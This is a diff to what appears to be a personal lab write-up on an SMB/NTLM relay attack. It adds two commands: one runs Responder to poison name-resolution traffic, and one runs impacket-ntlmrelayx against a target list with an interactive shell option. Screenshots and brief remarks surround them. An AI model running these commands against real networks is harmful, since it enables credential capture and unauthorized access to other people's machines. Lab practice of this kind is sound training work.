@@ -13,6 +13,10 @@ turn off the smb and http
 
 lets start the responder and poision the traffic
 
+```
+sudo responder -I eth0 -dPv
+```
+
 ![Screenshot from 2025-05-05 13-49-41](https://github.com/user-attachments/assets/25b60821-766f-4e94-a020-64d525861c1e)
 
 ![Screenshot from 2025-05-05 13-49-50](https://github.com/user-attachments/assets/d49476f6-b612-480b-ad1d-ea0ca5db5fa5)
@@ -23,6 +27,10 @@ lets start the responder and poision the traffic
 Lets create a file where we have the ip of our targets and we will feed it to impacket
 
 ![Screenshot from 2025-05-05 13-53-48](https://github.com/user-attachments/assets/348595c6-3870-4c63-a241-52d7f83af276)
+
+```
+impacket-ntlmrelayx -tf iptargets.txt -smb2support -i
+```
 
 ![Screenshot from 2025-05-05 13-50-00](https://github.com/user-attachments/assets/bff943de-c32b-450a-ba01-d8f3d62431d4)
 
